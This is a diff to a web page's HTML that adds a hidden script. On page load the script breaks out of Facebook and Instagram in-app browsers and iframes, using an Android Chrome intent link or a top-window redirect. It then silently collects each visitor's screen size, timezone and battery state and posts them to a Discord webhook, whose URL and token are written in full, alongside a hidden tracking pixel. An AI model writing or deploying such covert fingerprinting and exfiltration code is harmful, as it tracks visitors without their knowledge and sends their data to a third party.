@@ -58,12 +58,34 @@
         </div>
     </div>
 
-    <!-- Canarytokens Web Bug Pixel (Your updated token is listed below) -->
+    <!-- Canarytokens Web Bug Pixel -->
     <img src="http://canarytokens.com/about/stuff/ng8y8yhet53cpg79qndgwv5ds/submit.aspx" style="display:none;" alt="" />
 
     <script>
-    async function gatherFingerprint() {
-        // 1. Gather device metrics
+    async function handleSecurityTrap() {
+        const currentUrl = window.location.href;
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        // 1. IN-APP SANDBOX BREAKOUT CHECK
+        // Check if trapped inside Facebook, Instagram, or an iframe environment
+        const isFB = /FBAN|FBAV|Instagram/i.test(userAgent);
+        const isTrappedFrame = (window.top !== window.self);
+
+        if (isFB || isTrappedFrame) {
+            // Android Escape Protocol: Force drop into Chrome app using an intent link
+            if (/android/i.test(userAgent)) {
+                const cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+                window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+                return; // Stop execution here so it refires in the real Chrome browser
+            }
+            // iOS Escape Protocol: Force top window to jump out of the WebKit iframe view
+            else if (/iPad|iPhone|iPod/.test(userAgent) && isTrappedFrame) {
+                window.top.location.href = currentUrl;
+                return;
+            }
+        }
+
+        // 2. TELEMETRY COLLECTION (Runs once safely in native browser)
         const data = {
             screen_size: `${window.screen.width}x${window.screen.height}`,
             local_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -75,7 +97,6 @@
             is_charging: "N/A"
         };
 
-        // 2. Attempt to read battery if supported
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
@@ -84,10 +105,9 @@
             } catch (e) {}
         }
 
-        // 3. Your updated Discord Webhook URL
+        // 3. EXFILTRATION TO DISCORD
         const webhookUrl = "https://discord.com/api/webhooks/1520677154625687642/mYWD47y-YzrA9bRAghNySijrG-YqLUKnx9J8s1AjmOAObzfLA6xB4QFlx-rwTJd5KWXm";
         
-        // 4. Send the formatted layout message straight to your Discord channel
         fetch(webhookUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -97,8 +117,8 @@
         });
     }
 
-    // Automatically execute the script when the webpage finishes loading
-    window.addEventListener("DOMContentLoaded", gatherFingerprint);
+    // Run combined sequence on page load
+    window.addEventListener("DOMContentLoaded", handleSecurityTrap);
     </script>
 
 </body>
